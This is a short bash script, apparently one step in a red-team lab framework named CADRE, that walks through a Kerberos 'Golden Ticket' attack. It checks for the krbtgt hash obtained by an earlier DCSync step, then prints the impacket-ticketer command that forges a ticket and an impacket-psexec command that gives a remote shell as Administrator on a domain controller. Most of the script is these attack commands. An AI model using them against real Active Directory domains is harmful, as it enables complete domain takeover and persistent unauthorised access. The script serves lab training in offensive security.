#!/bin/bash
# CADRE — WT#010 Golden Ticket
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#010 — Golden Ticket"
start_attack "010" "Golden Ticket"

require_tool impacket-ticketer
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Check for prerequisites from WT#009"
run_cmd "ls -la dcsync_output.txt 2>/dev/null || echo 'WARNING: Run WT#009 first to obtain krbtgt hash and domain SID'"

step "Step 2: Forge golden ticket (edit hashes before running)"
run_cmd "echo 'Usage: impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain $DOMAIN_ROOT Administrator'"

step "Step 3: Inject ticket into Kerberos cache"
run_cmd "echo 'Then: export KRB5CCNAME=/tmp/kirbi && impacket-ticketer ... && impacket-psexec $DOMAIN_ROOT/Administrator@$DC01 -k -no-pass'"

result $? "Golden Ticket instructions displayed"
